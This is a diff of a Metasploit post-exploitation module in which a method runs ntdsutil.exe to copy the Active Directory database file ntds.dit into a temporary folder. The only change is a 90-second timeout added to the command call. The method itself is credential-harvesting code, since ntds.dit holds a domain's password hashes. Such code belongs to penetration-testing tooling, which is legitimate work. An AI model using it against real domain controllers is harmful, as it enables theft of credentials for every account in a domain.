@@ -79,7 +79,7 @@ class Metasploit3 < Msf::Post
   def ntdsutil_method
     tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
-    result = cmd_exec("ntdsutil.exe", command_arguments)
+    result = cmd_exec("ntdsutil.exe", command_arguments,90)
     if result.include? "IFM media created successfully"
       file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
       print_status "NTDS database copied to #{file_path}"
